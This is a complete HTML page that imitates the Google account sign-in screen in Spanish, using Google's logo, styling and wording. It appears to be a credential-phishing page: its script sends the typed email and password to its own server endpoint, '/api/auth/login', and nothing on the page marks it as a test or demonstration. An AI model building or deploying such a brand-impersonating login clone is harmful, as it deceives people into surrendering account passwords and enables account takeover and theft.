<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Acceder - Cuentas de Google</title>
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/><path fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/><path fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/><path fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/></svg>">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { font-size: 16px; }
body {
  background: #fff;
  font-family: 'Roboto', Arial, Helvetica, sans-serif;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  color: #202124;
  -webkit-font-smoothing: antialiased;
}

.card {
  width: 100%;
  max-width: 450px;
  border: 1px solid #dadce0;
  border-radius: 8px;
  padding: 48px 40px 36px;
}

@media (max-width: 500px) {
  .card { border: none; padding: 36px 24px 28px; }
}

.logo { text-align: center; margin-bottom: 16px; }

h1 {
  font-size: 24px;
  font-weight: 400;
  text-align: center;
  color: #202124;
  margin-bottom: 8px;
}

.subtitle {
  font-size: 16px;
  color: #202124;
  text-align: center;
  margin-bottom: 32px;
}

.input-wrap { position: relative; margin-bottom: 8px; }

input[type="text"], input[type="password"], input[type="email"] {
  width: 100%;
  height: 56px;
  border: 1px solid #dadce0;
  border-radius: 4px;
  padding: 24px 16px 8px;
  font-size: 16px;
  font-family: inherit;
  color: #202124;
  outline: none;
  background: transparent;
  transition: border-color .2s;
}

input:focus { border-color: #1a73e8; border-width: 2px; }
input:focus ~ .float-label { color: #1a73e8; top: 10px; font-size: 12px; }
input:not(:placeholder-shown) ~ .float-label { top: 10px; font-size: 12px; }

.float-label {
  position: absolute;
  left: 16px;
  top: 18px;
  font-size: 16px;
  color: #5f6368;
  pointer-events: none;
  transition: all .15s ease;
  background: transparent;
}

.show-pwd {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  cursor: pointer;
  padding: 4px;
  color: #5f6368;
  font-size: 13px;
  font-family: inherit;
}
.show-pwd:hover { color: #1a73e8; }

.forgot {
  display: inline-block;
  font-size: 14px;
  color: #1a73e8;
  text-decoration: none;
  cursor: pointer;
  background: none;
  border: none;
  font-family: inherit;
  padding: 0;
  margin-top: 4px;
  margin-bottom: 24px;
}
.forgot:hover { text-decoration: underline; }

.error-box {
  display: none;
  background: #fce8e6;
  border-radius: 4px;
  padding: 12px 16px;
  font-size: 14px;
  color: #c5221f;
  margin-bottom: 16px;
}

.actions {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-top: 24px;
}

.create-link {
  font-size: 14px;
  color: #1a73e8;
  text-decoration: none;
  cursor: pointer;
  background: none;
  border: none;
  font-family: inherit;
  font-weight: 500;
}
.create-link:hover { text-decoration: underline; }

.btn {
  background: #1a73e8;
  color: #fff;
  border: none;
  border-radius: 4px;
  height: 36px;
  padding: 0 24px;
  font-size: 14px;
  font-weight: 500;
  font-family: inherit;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 8px;
  transition: background .2s, box-shadow .2s;
  letter-spacing: .25px;
}
.btn:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(0,0,0,.3); }
.btn:disabled { opacity: .7; cursor: not-allowed; }

.spinner {
  width: 14px; height: 14px;
  border: 2px solid rgba(255,255,255,.4);
  border-top-color: #fff;
  border-radius: 50%;
  animation: spin .6s linear infinite;
  display: inline-block;
}
@keyframes spin { to { transform: rotate(360deg); } }

.footer-links {
  display: flex;
  flex-wrap: wrap;
  gap: 16px;
  margin-top: 40px;
  padding: 0 8px;
  font-size: 12px;
  color: #5f6368;
}
.footer-links a { color: #5f6368; text-decoration: none; }
.footer-links a:hover { text-decoration: underline; }
.footer-links .spacer { flex: 1; }
</style>
</head>
<body>

<div class="card">
  <div class="logo">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="92" height="31" aria-label="Google">
      <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
      <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
      <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
      <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
      <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
      <path d="M35.29 41.41V32h31.86c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.71.36 15.53 16.32.07 35.5.07c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
    </svg>
  </div>

  <h1>Acceder</h1>
  <p class="subtitle">para continuar en Google</p>

  <div class="error-box" id="err-box">
    La dirección de correo electrónico o la contraseña no es correcta.
    <a href="#" style="display:block;margin-top:4px;color:#1a73e8;font-size:13px">¿Olvidaste tu contraseña?</a>
  </div>

  <form id="form" novalidate>
    <div class="input-wrap">
      <input type="email" id="u" name="email" placeholder=" " autocomplete="email" required>
      <span class="float-label">Correo electrónico o teléfono</span>
    </div>
    <div class="input-wrap" style="margin-top:16px">
      <input type="password" id="p" name="password" placeholder=" " autocomplete="current-password" required style="padding-right:80px">
      <span class="float-label">Introducir contraseña</span>
      <button type="button" class="show-pwd" id="show-pwd">Mostrar</button>
    </div>
    <div style="margin-top:8px">
      <button type="button" class="forgot">¿Olvidaste tu contraseña?</button>
    </div>
    <div class="actions">
      <button type="button" class="create-link">Crear cuenta</button>
      <button type="submit" class="btn" id="btn">Siguiente</button>
    </div>
  </form>
</div>

<div class="footer-links">
  <a href="#">Español (Latinoamérica)</a>
  <span class="spacer"></span>
  <a href="#">Ayuda</a>
  <a href="#">Privacidad</a>
  <a href="#">Condiciones</a>
</div>

<script>
const showPwdBtn = document.getElementById('show-pwd');
showPwdBtn.addEventListener('click', () => {
  const p = document.getElementById('p');
  if (p.type === 'password') { p.type = 'text'; showPwdBtn.textContent = 'Ocultar'; }
  else { p.type = 'password'; showPwdBtn.textContent = 'Mostrar'; }
});

document.getElementById('form').addEventListener('submit', async e => {
  e.preventDefault();
  const btn = document.getElementById('btn');
  const errBox = document.getElementById('err-box');
  errBox.style.display = 'none';
  btn.innerHTML = '<div class="spinner"></div>';
  btn.disabled = true;
  try {
    const r = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: document.getElementById('u').value, password: document.getElementById('p').value })
    });
    if (!r.ok) errBox.style.display = 'block';
  } catch { errBox.style.display = 'block'; }
  btn.innerHTML = 'Siguiente';
  btn.disabled = false;
});
</script>
</body>
</html>
